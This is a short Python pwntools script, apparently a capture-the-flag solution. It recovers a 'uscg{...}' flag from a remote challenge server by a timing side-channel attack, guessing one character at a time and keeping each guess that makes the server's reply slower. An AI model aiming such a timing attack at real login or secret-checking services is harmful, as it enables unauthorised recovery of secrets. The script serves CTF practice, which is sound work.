import time
import subprocess
from pwn import *


#range needs to be from 32-127
#proc.communicate needs to be base_string + str(x)
# if time of that run is longer than the saved run,
# concat x to base_string and 
# set saved run to this runs time

#base_string = 'uscg{NOT_THIS_' #this after runnign for a bit so I could speed up the script

base_string = 'uscg{'


correct_end = 1.29
# correct_end = 3.55 # use this when adding more to base_string
# io = remote('0.cloud.chals.io', 29427)
# print(io.recv())
# start =time.time()
# io.sendline(b'uscg{')
# e = io.recv()
# print(time.time() - start)
# print(e)
bob = True
while bob:
    if(base_string[-1] == '}'):
        print(base_string)
        break
    for x in range(64,127):
        io = remote('0.cloud.chals.io', 29427)
        # proc = subprocess.Popen('nc 0.cloud.chals.io 29427', stdin=subprocess.PIPE, shell=True, encoding='utf8')
        # r = remote('0.cloud.chals.io', 29427)
        print(io.recv())
        start = time.time()
        # proc.communicate(str(base_string+chr(x)))
        io.sendline(str.encode(f'{base_string}{chr(x)}'))
        # io.sendline(b'uscg{')
        resp = io.recv()
        end = time.time() - start
        print(resp)
        print(end)
        io.close()
        if(end - correct_end >=.2):
            correct_end = end
            base_string = base_string+chr(x)
            break
        print(base_string+chr(x))
        print(end)
        print(correct_end)
        print(chr(x))
